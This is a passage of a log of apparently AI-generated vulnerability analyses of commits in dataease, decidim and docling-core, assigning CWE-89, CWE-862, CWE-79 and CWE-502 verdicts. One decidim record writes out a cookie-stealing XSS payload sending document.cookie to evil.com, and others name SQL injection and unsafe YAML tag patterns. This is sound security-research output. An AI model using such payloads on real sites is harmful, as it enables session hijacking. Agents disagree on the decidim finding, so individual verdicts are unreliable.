---\n\n### **3. CWE-89: SQL Injection** (Secondary — via Variable Substitution)\n\n**Location**: `SqlparserUtils.transFilter()` (lines 691–722)\n\n**Attack Vector**:\n- `SqlVariableDetails` contains `operator`, `deType` (data type), and `value` (list of strings).\n- For the `in` operator with numeric types (deType 2 or 3), line 698: `return String.join(\",\", sqlVariableDetails.getValue());` — values are joined raw with commas, **no quoting, no escaping**.\n- For `between` operator with non-date types, line 712–716: raw values returned directly.\n- For default (other) operators, line 719: raw value returned directly.\n- These values get inserted into the SQL via string replacement (`sql.replace(matcher.group(), transFilter(...))` at line 94/98/101).\n- An attacker can craft a variable value containing SQL metacharacters (e.g., `1 UNION SELECT ...`) to break out of the intended expression.\n\n**Impact**: Even in contexts where the SQL template is fixed but variable values are user-controlled, numeric-type variables can be used to inject SQL.\n\n---\n\n### 4. (Lower Risk) Missing Authentication on `previewSql` and `loadRemoteFile`\n\n- `previewSql` is exposed via `DatasetDataApi` with **no `@DePermit` annotation** — meaning any authenticated user can call it against any datasource.\n- `loadRemoteFile` similarly has no `@DePermit` annotation.\n- While the datasource lookup requires knowing a datasource ID, these IDs are sequential Long values that are enumerable.\n\n---\n\n### Verdict Block\n\n```\nVULNERABILITY_FOUND: true\nCWE_ID: CWE-89, CWE-918\nCWE_NAME: SQL Injection, Server-Side Request Forgery (SSRF)\n```\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/dataease__dataease/8f1c21834a62/agent3", "created_at": "2026-08-07T12:42:26.734699+00:00"}
{"repo_name": "decidim/decidim", "repo_url": "https://github.com/decidim/decidim.git", "commit": "1b99136a1c7aa02616a0b54a6ab88d12907a57a9", "agent": "agent1", "model": "polito/deepseek-v4", "status": "ok", "response": "Let me read all the diff files to understand the nature of each change.\nNow let me carefully examine the key files that appear to have security relevance — files 09, 10, 11, 13, and 22 in more detail.\nNow let me also verify the form's `component` method (file_10) which supplies the component context used by the authorization checks:\nNow I have all the information needed to provide a complete analysis.\n\n---\n\n## Analysis\n\nThis commit spans 24 files and adds granular amendment feature settings (`amendment_creation_enabled`, `amendment_reaction_enabled`, `amendment_promotion_enabled`) to the Proposals component's step-level configuration in what is clearly the **Decidim** participatory democracy framework.\n\n### The security vulnerability\n\nThe core security fix is concentrated in **file_09** and **file_13**:\n\n**File 13 — `Permissions` class (`amend_action?` method)**\n\n**Before** (lines 83-92):\n```ruby\ndef amend_action?\n  return unless permission_action.subject == :amendment\n  return allow! if permission_action.action == :create\n  return allow! if permission_action.action == :reject\n  return allow! if permission_action.action == :promote\n  return allow! if permission_action.action == :accept\n  amendment = context.fetch(:amendment, nil)\n  toggle_allow(amendment&.amender == user)\nend\n```\n\nThe permission system **unconditionally allowed** all four amendment operations (`create`, `reject`, `promote`, `accept`) regardless of whether the component's settings had those features enabled. No check on `amendments_enabled` (a global setting that already existed), and no check on any step-level sub-settings.\n\n**After** (lines 83-98):\n```ruby\ndef amend_action?\n  return unless permission_action.subject == :amendment\n  return disallow! unless component.settings.amendments_enabled\n\n  case permission_action.action\n  when :create\n    return allow! if component.current_settings.amendment_creation_enabled\n  when :accept,\n      :reject\n    return allow! if component.current_settings.amendment_reaction_enabled\n  when :promote\n    return allow! if component.current_settings.amendment_promotion_enabled\n  end\n\n  amendment = context.fetch(:amendment, nil)\n  toggle_allow(amendment&.amender == user)\nend\n```\n\nNow the permission system:\n1. Refuses all amendment operations if the global `amendments_enabled` setting is false.\n2. Checks `amendment_creation_enabled` before allowing creation.\n3. Checks `amendment_reaction_enabled` before allowing accept/reject.\n4. Checks `amendment_promotion_enabled` before allowing promotion.\n\n**File 09 — `AmendmentsController`**\n\n**Before**: `enforce_permission_to` calls did not pass `current_component`, so the permission system had no access to the component context to check its settings.\n\n**After**: All four endpoints now pass `current_component: @form.component`, supplying the necessary component context for the permission checks in file_13.\n\n**File 10** adds the `component` method to the form object so that `@form.component` is available.\n\n### Why this is a security fix\n\nThe component already had settings intended to control whether amendments could be created, accepted/rejected, or promoted. However, these settings were **not enforced server-side**. Only the UI layer (buttons, links) might have hidden these operations, but a malicious user who knew the API endpoints could craft direct HTTP requests to:\n\n- Create amendments even when `amendment_creation_enabled` was off\n- Accept/reject amendments even when `amendment_reaction_enabled` was off\n- Promote amendments even when `amendment_promotion_enabled` was off\n- Perform any amendment operation even when `amendments_enabled` was off globally\n\nThis is a textbook **Missing Authorization** vulnerability: the intended authorization policy (based on component settings) was simply never checked.\n\n### Classification\n\n**CWE-862: Missing Authorization** — The software does not perform an authorization check when an actor attempts to perform an action. Here, the amendment feature settings existed but were never consulted by the authorization logic, allowing bypass of the intended restrictions.\n\nNo other CWE applies more specifically. This is not CWE-863 (Incorrect Authorization) because the check wasn't flawed — it was entirely absent for this dimension of the policy.\n\n---\n\nVULNERABILITY_FOUND: yes\nCWE_ID: CWE-862\nCWE_NAME: Missing Authorization\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/decidim__decidim/1b99136a1c7a/agent1", "created_at": "2026-08-07T12:44:49.704412+00:00"}
{"repo_name": "decidim/decidim", "repo_url": "https://github.com/decidim/decidim.git", "commit": "1b99136a1c7aa02616a0b54a6ab88d12907a57a9", "agent": "agent2", "model": "polito/deepseek-v4", "status": "ok", "response": "Let me read all the diff files to understand the changes.\nLet me look at the file paths involved in these changes to understand the structure better.\nLet me identify the actual files being modified by searching the codebase for matching content.\nLet me look at the Proposals permissions file more closely.\nLet me find the actual amendments controller and understand its permissions flow.\nNow let me verify some additional details to confirm the full vulnerability picture.\nNow let me verify the amendment model change to understand the full scope of the security improvement.\nBased on my thorough analysis of all 24 changed files, I have a clear picture of this commit.\n\n## Analysis\n\nThis commit adds **step-level settings** (`amendment_creation_enabled`, `amendment_reaction_enabled`, `amendment_promotion_enabled`) to the Decidim amendments feature, replacing a coarse global toggle with granular per-step controls. The core security fix is in the authorization layer:\n\n**Before the fix** — The `amend_action?` method in `decidim-core/app/permissions/decidim/permissions.rb` unconditionally allowed `:create`, `:reject`, `:promote`, and `:accept` actions on the `:amendment` subject, with **no check** on whether:\n- `amendments_enabled` was actually set to `true` at the component level\n- The step-level settings permitted the specific action\n\nCombined with the controller's `enforce_permission_to` calls that did **not** pass `current_component:` context, the permission system could not even access the component settings to perform such checks even if they existed. This meant any authenticated user could directly POST to the API endpoints to create, accept, reject, or promote amendments regardless of how the component was configured.\n\n**After the fix** — The permission method:\n1. Returns `disallow!` unless `component.settings.amendments_enabled` is true\n2. Checks `component.current_settings.amendment_creation_enabled` for `:create`\n3. Checks `component.current_settings.amendment_reaction_enabled` for `:accept`/`:reject`\n4. Checks `component.current_settings.amendment_promotion_enabled` for `:promote`\n\nThe controller now passes `current_component: @form.component`, and a `component` method was added to the form base class. The helper methods were also updated to gate UI buttons behind the same checks.\n\nThis is a textbook **Missing Authorization** (CWE-862) vulnerability: the authorization checks were completely absent for these actions. No other CWE applies — the remaining changes (CSS styling, cell refactoring, i18n, test updates) are supporting infrastructure for this feature and are not independently security-relevant.\n\nVULNERABILITY_FOUND: yes\nCWE_ID: CWE-862\nCWE_NAME: Missing Authorization\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/decidim__decidim/1b99136a1c7a/agent2", "created_at": "2026-08-07T12:47:39.528092+00:00"}
{"repo_name": "decidim/decidim", "repo_url": "https://github.com/decidim/decidim.git", "commit": "1b99136a1c7aa02616a0b54a6ab88d12907a57a9", "agent": "agent3", "model": "polito/deepseek-v4", "status": "ok", "response": "Let me verify the XSS finding in the messaging system more thoroughly and also check if there are additional vulnerabilities.\nNow I have enough information to conclude my analysis. Let me verify a couple more patterns to be thorough.\nI have now thoroughly explored the repository. Let me summarize my findings.\n\nThe workspace is a **Decidim** application (a participatory democracy framework built on Ruby on Rails). After extensive analysis of controllers, views, models, commands, forms, helpers, services, and uploaders across the main modules, I have identified a **Stored Cross-Site Scripting (XSS)** vulnerability.\n\n**Vulnerability: Stored XSS in the Messaging/Conversations System**\n\n- **Location**: `/work/decidim-core/app/views/decidim/messaging/conversations/_message.html.erb`, line 12\n- **Vector**: `<%= simple_format(message.body) %>`\n- **Details**: The `message.body` attribute is fully user-controlled (sent via the messaging/conversations feature). The `simple_format` Rails helper wraps text in `<p>` tags and marks the output `html_safe` **without escaping HTML entities**. No sanitization (`strip_tags`, `sanitize`, `decidim_sanitize`, or `html_escape`) is applied anywhere in the chain:\n  - The `MessageForm` only validates `presence` of body — no sanitization.\n  - The `ReplyToConversation` and `StartConversation` commands save the body as-is.\n  - The `Message` model only validates `presence` and `length` — no sanitization.\n  - The `_message.html.erb` partial calls `simple_format(message.body)` without any sanitization.\n  - The AJAX endpoints (`create.js.erb`, `update.js.erb`) also call `.html_safe` on the rendered partial, confirming the XSS is exploitable via both page-load and AJAX paths.\n- **Impact**: An attacker can send a message containing arbitrary HTML/JavaScript (e.g., `<script>document.location='https://evil.com/?c='+document.cookie</script>`), which will execute in the recipient's browser when viewing the conversation, leading to cookie theft, session hijacking, and other client-side attacks.\n\nThis is the most specific and confidently identified vulnerability. No other finding rises to the same level of certainty.\n\n---\n\nVULNERABILITY_FOUND: yes\nCWE_ID: CWE-79\nCWE_NAME: Cross-Site Scripting\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/decidim__decidim/1b99136a1c7a/agent3", "created_at": "2026-08-07T12:52:56.244176+00:00"}
{"repo_name": "docling-project/docling-core", "repo_url": "https://github.com/docling-project/docling-core.git", "commit": "3e8d628eeeae50f0f8f239c8c7fea773d065d80c", "agent": "agent1", "model": "polito/deepseek-v4", "status": "ok", "response": "## Analysis\n\nThis commit makes a single, consistent change across two files: switching from `yaml.FullLoader` to `yaml.SafeLoader` when deserializing YAML data.\n\n### What changed\n\n**File 01** (production code — `DoclingDocument` class):\n- **Before:** `data = yaml.load(f, Loader=yaml.FullLoader)` \n- **After:** `data = yaml.load(f, Loader=yaml.SafeLoader)`\n\nThis is in a classmethod that loads/serializes a `DoclingDocument` from a YAML file on disk. The input data likely originates from user-supplied or untrusted sources.\n\n**File 02** (test code — `test_export_with_precision`):\n- **Before:** `exp_data = yaml.load(f, Loader=yaml.FullLoader)`\n- **After:** `exp_data = yaml.load(f, Loader=yaml.SafeLoader)`\n\nSame pattern, in a test helper that reads expected data from YAML files.\n\n### Security significance\n\nIn PyYAML, the loader hierarchy is:\n\n| Loader | Behavior |\n|---|---|\n| `UnsafeLoader` (deprecated) | Arbitrary Python object construction — full code execution risk |\n| `FullLoader` | Constructs Python objects for many YAML tags — still allows arbitrary code execution via e.g. `!!python/object:os.system`, `!!python/object:subprocess.run`, `!!python/tuple`, `!!python/dict`, etc. |\n| `SafeLoader` | Only standard YAML types (dict, list, str, int, float, bool, None) — **no arbitrary code execution** |\n\n`FullLoader` is **not safe**. While it was intended as a middle ground between `UnsafeLoader` and `SafeLoader`, it still permits construction of arbitrary Python objects by tag resolution, which can lead to full remote code execution when an attacker controls the YAML input.\n\nThe fix correctly restricts deserialization to `SafeLoader`, which prevents an attacker from embedding malicious YAML tags that would cause arbitrary code execution during deserialization.\n\n### Classification\n\nThis is a textbook case of **Insecure Deserialization** — CWE-502. The application deserializes untrusted YAML data without sufficiently restricting what types can be instantiated. `FullLoader` allows construction of arbitrary Python objects, which an attacker can leverage for code execution.\n\nNo other CWE fits more precisely. For instance, CWE-94 (Code Injection) is a broader category — the injection here occurs specifically *through deserialization*, making CWE-502 the correct, most specific classification.\n\n---\n\nVULNERABILITY_FOUND: yes\nCWE_ID: CWE-502\nCWE_NAME: Deserialization of Untrusted Data\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/docling-project__docling-core/3e8d628eeeae/agent1", "created_at": "2026-08-07T12:54:22.506578+00:00"}
{"repo_name": "docling-project/docling-core", "repo_url": "https://github.com/docling-project/docling-core.git", "commit": "3e8d628eeeae50f0f8f239c8c7fea773d065d80c", "agent": "agent2", "model": "polito/deepseek-v4", "status": "ok", "response": "Let me look at the actual current version of the source code to identify the method name and understand the context better.\nNow I have all the information needed to analyze this commit.\n\n## Analysis\n\nThe commit makes two identical changes, both switching from `yaml.FullLoader` to `yaml.SafeLoader`:\n\n1. **`/work/docling_core/types/doc/document.py:4357`** — In the `DoclingDocument.load_from_yaml()` class method. This is a public API method that loads a YAML file provided by the caller and deserializes it into a `DoclingDocument` object. The YAML content is user-supplied (untrusted data).\n\n2. **`/work/test/test_docling_doc.py:1976`** — In the `test_export_with_precision()` test function, which reads expected test data from a YAML file. Test data is typically trusted, but the fix applies the same hardening principle.\n\n### Security Impact\n\nIn PyYAML, `yaml.FullLoader` supports the full YAML specification, including Python-specific tags such as `!!python/object`, `!!python/object/apply`, `!!python/name`, and `!!python/module`. These tags allow the deserialization of arbitrary Python objects during YAML parsing — a classic vector for achieving arbitrary code execution. An attacker who can craft a malicious YAML document can exploit this to execute arbitrary Python code on the server processing the document.\n\n`yaml.SafeLoader`, by contrast, only supports standard, safe YAML types (dicts, lists, strings, numbers, booleans, None) and explicitly blocks all Python-object-constructing tags, thereby preventing this attack vector.\n\nThe fix is correct: `load_from_yaml()` only needs basic Python types because the deserialized dict is immediately passed to Pydantic's `model_validate()`, which handles validation on its own terms. There is no legitimate need for `FullLoader`'s ability to construct arbitrary objects.\n\n### CWE Classification\n\nThe vulnerability is a textbook case of **CWE-502: Deserialization of Untrusted Data** — untrusted data is deserialized using a deserialization mechanism that can construct arbitrary objects, leading to possible code execution. This is the most specific and accurate classification.\n\n---\n\nVULNERABILITY_FOUND: yes\nCWE_ID: CWE-502\nCWE_NAME: Deserialization of Untrusted Data\n", "output_dir": "/home/medo/laMiaTesi/agentAnalysisDocker/outputs/polito_deepseek-v4/docling-project__docling-core/3e8d628eeeae/agent2", "created_at": "2026-08-07T12:55:43.219012+00:00"}
